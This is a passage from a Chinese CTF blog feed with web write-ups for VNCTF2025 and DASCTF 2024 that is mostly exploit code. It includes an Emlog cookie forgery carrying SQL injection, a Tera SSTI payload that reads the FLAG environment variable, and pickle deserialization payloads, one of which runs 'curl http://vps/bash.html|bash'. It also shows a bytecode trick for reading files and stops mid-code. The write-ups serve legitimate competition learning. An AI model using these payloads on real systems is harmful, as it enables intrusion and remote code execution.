class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">32</span>; <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-variable">$retStr</span> .= <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$rand_string</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$rand_string</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-variable">$user_agent</span> = <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0&#x27;</span>;<br><span class="hljs-variable">$auth_key</span> = <span class="hljs-variable">$retStr</span>.<span class="hljs-variable">$user_agent</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;AUTH_KEY:&#x27;</span> . <span class="hljs-variable">$auth_key</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;x&#x27; and updatexml(1,concat(0x7e,(select(substr(username,1,16))from(emlog_user)),0x7e),1) #&quot;</span>;<br><span class="hljs-variable">$expiration</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$username</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$expiration</span>;<br><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$auth_key</span>);<br><span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$username</span> . <span class="hljs-string">&#x27;|&#x27;</span> .  <span class="hljs-variable">$expiration</span>, <span class="hljs-variable">$key</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\nEM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;|&quot;</span>.<span class="hljs-variable">$expiration</span>.<span class="hljs-string">&quot;|&quot;</span>.<span class="hljs-variable">$hash</span>;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">AUTH_KEY:<span class="hljs-title function_ invoke__">yxuzKkM2QC8L8WLPFvawb</span>(mI4R&amp;NglOAMozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; <span class="hljs-attr">rv</span>:<span class="hljs-number">135.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">135.0</span><br>                               <br>EM_AUTHCOOKIE_RbAWvNJZ5YMeZLGMr56lfjValO3yqYlr=x<span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select(substr(username,1,16))from(emlog_user)),0x7e),1) #|0|1347191e25f82f5b77b6d5b283ee4064</span><br></code></pre></td></tr></table></figure><p>å†ç”¨å¾—åˆ°çš„ç”¨æˆ·åç”Ÿæˆå¯ç”¨cookieç™»å½•åå°ã€‚</p><p>æˆ–è€…ç”¨AUTH_KEYç”Ÿæˆä¸‡èƒ½å¯†ç ç›´æ¥ç™»å½•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateAuthCookie</span>(<span class="hljs-params"><span class="hljs-variable">$user_login</span>, <span class="hljs-variable">$expiration</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">emHash</span>(<span class="hljs-variable">$user_login</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$expiration</span>);<br>    <span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$user_login</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$expiration</span>, <span class="hljs-variable">$key</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$user_login</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$expiration</span> . <span class="hljs-string">&#x27;|&#x27;</span> . <span class="hljs-variable">$hash</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">emHash</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;md5&#x27;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;yxuzKkM2QC8L8WLPFvawb(mI4R&amp;NglOA558fb80a37ff0f45d5abbc907683fc02&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">generateAuthCookie</span>(<span class="hljs-string">&quot;&#x27; or 1=1#&quot;</span>, <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250211213625630.png" alt="image-20250211213625630"></p><p>åç»­åå°ä¸Šä¼ æ¶æ„æ’ä»¶RCEï¼š</p><p><a href="https://blog.csdn.net/W13680336969/article/details/137267677">Emlog Pro ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2023-44974ï¼‰_emlog v2.2.0åå°æ’ä»¶ä¸Šä¼ æ¼æ´-CSDNåšå®¢</a></p><p><a href="https://github.com/yangliukk/emlog/tree/main">yangliukk&#x2F;emlog</a></p><p>å‹ç¼©åŒ…ä¸­å¿…é¡»å­˜åœ¨ä¸€ä¸ªä¸å‹ç¼©åŒ…åŒåçš„PHPæ–‡ä»¶ï¼Œå¹¶ä¸”ä¸Šä¼ æˆåŠŸä¸ä¼šè¿”å›ä¸Šä¼ è·¯å¾„ã€‚</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250211214340591.png" alt="image-20250211214340591"></p><p>æ‰“åŒ…ä¸Šä¼ ï¼š</p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250211214831024.png" alt="image-20250211214831024"></p><p><img src="/2025/02/09/VNCTF2025-WEB/image-20250211214930685.png" alt="image-20250211214930685"></p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF-2024æœ€åä¸€æˆ˜-WEBå¤ç°</title>
    <link href="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœŸæœ«å‘¨çš„æ—¶å€™çœ‹äº†çœ‹ï¼Œä¹Ÿæ‰“äº†æ‰“ï¼Œä½†æ˜¯å¿˜äº†å†™wpã€‚ã€‚ã€‚</p><p>åæ­£å¯’å‡ä»Šå¤©æ²¡å•¥äº‹ï¼Œå†å¤ç°ä¸€æŠŠå§ã€‚</p><h2 id="è¥¿æ¹–è®ºå‰‘é‚€è¯·å‡½è·å–å™¨"><a href="#è¥¿æ¹–è®ºå‰‘é‚€è¯·å‡½è·å–å™¨" class="headerlink" title="è¥¿æ¹–è®ºå‰‘é‚€è¯·å‡½è·å–å™¨"></a>è¥¿æ¹–è®ºå‰‘é‚€è¯·å‡½è·å–å™¨</h2><p>ä½ ä¸è¯´è°çŸ¥é“æ˜¯Teraçš„SSTIå•Šã€‚ã€‚ã€‚ã€‚</p><p>Rustçš„ç©æ„ï¼Œè¿™æ ·è¯»ç¯å¢ƒå˜é‡ç›´æ¥å‡ºäº†ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">&#123;%set my_var = <span class="hljs-title function_ invoke__">get_env</span>(name=<span class="hljs-string">&quot;FLAG&quot;</span>) %&#125;&#123;&#123;my_var&#125;&#125;<br></code></pre></td></tr></table></figure><p>æˆ–è€…ï¼š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">&#123;&#123; <span class="hljs-title function_ invoke__">get_env</span>(<span class="hljs-string">&quot;FLAG&quot;</span>) &#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207175129738.png" alt="image-20250207175129738"></p><h2 id="const-python"><a href="#const-python" class="headerlink" title="const_python"></a>const_python</h2><p>srcæŸ¥çœ‹æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request,jsonify,session<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password, auth=<span class="hljs-string">&#x27;ctfer&#x27;</span></span>):<br>        <span class="hljs-variable language_">self</span>.username = username<br>        <span class="hljs-variable language_">self</span>.password = password<br>        <span class="hljs-variable language_">self</span>.auth = auth<br><br>password = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>Admin = User(<span class="hljs-string">&#x27;admin&#x27;</span>, password,<span class="hljs-string">&quot;admin&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome to my application&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br><br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br><br><br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin&#x27;</span> :<br>            <span class="hljs-keyword">if</span> password == admin.password:<br>                session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&quot;admin&quot;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid Credentials&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">        &lt;!-- /src may help you&gt;</span><br><span class="hljs-string">            Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">            Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ppicklee&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ppicklee</span>():<br>    data = request.form[<span class="hljs-string">&#x27;data&#x27;</span>]<br><br>    sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    sys.modules[<span class="hljs-string">&#x27;sys&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    <span class="hljs-keyword">try</span>:<br><br>        pickle_data = base64.b64decode(data)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;<span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&#x27;setstate&#x27;</span>, <span class="hljs-string">&quot;globals&quot;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;template&#x27;</span>, <span class="hljs-string">&#x27;render&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>,<br>                 <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;requests&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>,  <span class="hljs-string">&#x27;pickle&#x27;</span>,<span class="hljs-string">&quot;class&quot;</span>,<span class="hljs-string">&quot;mro&quot;</span>,<span class="hljs-string">&quot;flask&quot;</span>,<span class="hljs-string">&quot;sys&quot;</span>,<span class="hljs-string">&quot;base&quot;</span>,<span class="hljs-string">&quot;init&quot;</span>,<span class="hljs-string">&quot;config&quot;</span>,<span class="hljs-string">&quot;session&quot;</span>&#125;:<br>            <span class="hljs-keyword">if</span> i.encode() <span class="hljs-keyword">in</span> pickle_data:<br>                <span class="hljs-keyword">return</span> i+<span class="hljs-string">&quot; waf !!!!!!!&quot;</span><br><br>        pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success pickle&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fail pickle&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    username = session[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    <span class="hljs-keyword">if</span> username != <span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&#x27;You are not admin!&#x27;</span>&#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">return</span>  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;app.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="hljs-literal">False</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>ç›´æ¥æ‰“pickleä¸å°±å®Œäº†ï¼Œæ¼äº†<code>subprocess</code>ï¼Œä½†æ˜¯å¥½åƒè¿™ä¸ªé‡Œé¢è°ƒç”¨çš„ä¹Ÿæ˜¯<code>os</code>ï¼Œè¿™é‡Œçš„<code>os</code>åªæ˜¯ç”¨<code>sys.modules[&#39;os&#39;] = &quot;not allowed&quot;</code>æ„æ€æ„æ€äº†ä¸€ä¸‹ï¼Œæ‰€ä»¥å®Œå…¨å¯ä»¥éé¢„æœŸã€‚</p><p><code>pker</code>è§£äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">i = <span class="hljs-number">0</span><br>s = <span class="hljs-string">&#x27;RCE&#x27;</span><br>lst = [i]<br>tpl = (<span class="hljs-number">0</span>,)<br>dct = &#123;tpl: <span class="hljs-number">0</span>&#125;<br>sp = GLOBAL(<span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;getoutput&#x27;</span>)<br>sp(s)<br><span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>data=<span class="hljs-string">b&#x27;&#x27;&#x27;I0</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">0S&#x27;curl http://vps/bash.html|bash&#x27;</span><br><span class="hljs-string">p1</span><br><span class="hljs-string">0(g0</span><br><span class="hljs-string">lp2</span><br><span class="hljs-string">0(I0</span><br><span class="hljs-string">tp3</span><br><span class="hljs-string">0(g3</span><br><span class="hljs-string">I0</span><br><span class="hljs-string">dp4</span><br><span class="hljs-string">0csubprocess</span><br><span class="hljs-string">getoutput</span><br><span class="hljs-string">p5</span><br><span class="hljs-string">0g5</span><br><span class="hljs-string">(g1</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(base64.b64encode(data))<br></code></pre></td></tr></table></figure><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207173020883.png" class="" title="image-20250207173020883"><p>ç½‘ä¸Šå¸ˆå‚…è¿˜æœ‰é«˜æ‰‹åšæ³•ï¼š<a href="https://blog.lie.moe/2024/12/22/dasctf_2024.12_writeup/">DASCTF 2024æœ€åä¸€æˆ˜ WriteUpé¢˜è§£ | æ¢“æ¼ªã®çª</a></p><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207173136767.png" alt="image-20250207173136767"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">exit(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;app.py&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>).write(<span class="hljs-string">&quot;#&quot;</span>+<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read()))<br></code></pre></td></tr></table></figure><p>ä¸ºäº†é¿å…é™·å…¥æ­»å¾ªç¯ï¼Œä½¿ç”¨ä¸€ä¸ªexitç›´æ¥ç»“æŸç¨‹åºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">ctimeit<br>repeat<br>(ccodecs<br>decode<br>(ccodecs<br>decode<br>(V65786974286f70656e28276170702e7079272c27612b27292e7772697465282223222b6f70656e28272f666c6167272c277227292e7265616428292929<br>Vhex<br>tRtRtR.<br></code></pre></td></tr></table></figure><p>æˆ–è€…æ¥è‡ªï¼š<a href="https://xu17.top/2024/12/23/2024DASCTF/#Web">DASCTF 2024æœ€åä¸€æˆ˜ wp - XU17</a></p><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207173636084.png" alt="image-20250207173636084"></p><p>å¦‚æœä¸è€ƒè™‘subprocessçš„éé¢„æœŸï¼Œå°±å‚è€ƒå®˜æ–¹wpç”¨çš„å¤æ‚æ–¹æ³•å§ã€‚</p><p>ä½¿ç”¨typesçš„<code>CodeType</code>ä¿®æ”¹å¸¸é‡å­—èŠ‚ç ï¼Œä¿®æ”¹è¿”å›çš„æ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">return</span>  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;app.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><br>oCode = src.__code__<br>secret.__code__= types.CodeType(oCode.co_argcount, <br>                                oCode.co_posonlyargcount, <br>                                oCode.co_kwonlyargcount, <br>                                oCode.co_nlocals, <br>                                oCode.co_stacksize, <br>                                oCode.co_flags,<br>                                oCode.co_code, <br>                                <span class="hljs-built_in">tuple</span>(c <span class="hljs-keyword">if</span> c != <span class="hljs-string">&#x27;app.py&#x27;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> oCode.co_consts), <br>                                oCode.co_names, <br>                                oCode.co_varnames,<br>                                oCode.co_filename,<br>                                oCode.co_name, <br>                                oCode.co_firstlineno, <br>                                oCode.co_lnotab,<br>                                oCode.co_freevars,<br>                                oCode.co_cellvars,)<br></code></pre></td></tr></table></figure><p>é€šè¿‡è¿™ä¸ªä»£ç æŸ¥çœ‹co_constï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> types<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">return</span>  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;app.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> src.__code__.__dir__():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span> : <span class="hljs-subst">&#123;<span class="hljs-built_in">getattr</span>(src.__code__, i)&#125;</span>&quot;</span>)<br><br>g1 = builtins.<span class="hljs-built_in">getattr</span><br>g2 = <span class="hljs-built_in">getattr</span>(src,<span class="hljs-string">&quot;__code__&quot;</span>)<br>g3 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_argcount&quot;</span>)<br>g4 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_posonlyargcount&quot;</span>)<br>g5 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_kwonlyargcount&quot;</span>)<br>g6 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_nlocals&quot;</span>)<br>g7 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_stacksize&quot;</span>)<br>g8 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_flags&quot;</span>)<br>g9 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_code&quot;</span>)<br>g10 = (<span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>, (<span class="hljs-string">&#x27;encoding&#x27;</span>,))<span class="hljs-comment">#g10 = getattr(g2,&quot;co_consts&quot;)</span><br>g11 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_names&quot;</span>)<br>g12 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_varnames&quot;</span>)<br>g13 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_filename&quot;</span>)<br>g14 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_name&quot;</span>)<br>g15 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_firstlineno&quot;</span>)<br>g16 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_lnotab&quot;</span>)<br>g17 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_freevars&quot;</span>)<br>g18 = <span class="hljs-built_in">getattr</span>(g2,<span 